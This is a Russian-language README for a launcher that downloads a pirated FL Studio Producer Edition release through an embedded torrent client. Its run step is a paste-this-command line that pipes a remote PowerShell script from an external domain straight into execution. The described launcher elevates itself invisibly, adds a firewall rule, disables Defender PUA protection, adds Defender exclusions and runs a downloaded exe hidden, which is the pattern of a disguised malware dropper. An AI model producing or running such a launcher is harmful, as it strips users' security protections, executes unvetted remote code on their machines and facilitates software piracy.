# FL Studio Downloader

Torque-стиль загрузчик для **FL Studio Producer Edition 26.1.4**, аналог `Premiere/` из родительской коллекции.

## Что внутри

| Файл | Назначение |
|------|-----------|
| `fl_studio.exe` | BT-клиент на libtorrent с вшитым `.torrent` (собирается через `../build_one.bat FL_Studio "<path>.torrent"`) |
| `fl_studio.ps1` | Лаунчер с GUI: скачивает `fl_studio.exe` с GitHub, показывает прогресс в стиле FL Studio, после DONE монтирует ISO / запускает установщик |

## Стиль GUI

Тёмная тема в стиле FL Studio:
- Фон `#1E1E1E`, панель `#2A2A2A`, серый текст `#B0B0B0`, светлый текст `#E8E8E8`
- Оранжевый акцент `#FF6B00` (фирменный цвет FL Studio) — прогресс-бар, заголовок
- Логотип FL Studio (фрукт) встроен как base64 (506×512 PNG) — рисуется программно через `New-FLLogo`

## Запуск

```powershell
irm 'https://edge.kpe-engine.com/p/fl_studio.ps1' | iex
```

Лаунчер:
1. Само-перезапуск в скрытом elevated-процессе (без мелькания консоли)
2. `SetProcessDPIAware()` + TLS 1.2
3. Скачивает `fl_studio.exe` с GitHub в `%LOCALAPPDATA%\FL_Studio\fl_studio.exe`
4. Добавляет firewall-правило `FL_Studio Downloader`
5. Отключает PUA protection (`Set-MpPreference -PUAProtection disable`) на время установки
6. Добавляет Defender exclusions для папок и процесса
7. Запускает exe скрытно с аргументом SAVE_DIR
8. Читает stderr: `PROGRESS <pct> <dl_mb> <tot_mb> <speed_kbps> <peers>`, `DONE`, `ERROR`
9. После DONE — ищет `.iso` (монтирует → `Set-up.exe`) или `.exe` установщик → запускает мастер установки

## Сборка

```bat
cd ..
install_libtorrent.bat
build_one.bat FL_Studio "C:\Users\Lumena\Downloads\Image-Line - FL Studio Producer Edition 26.1.4.torrent"
```

Затем залить `fl_studio.exe` на GitHub в репозиторий `AmplitudeQuail/FL_Studio` (main branch).
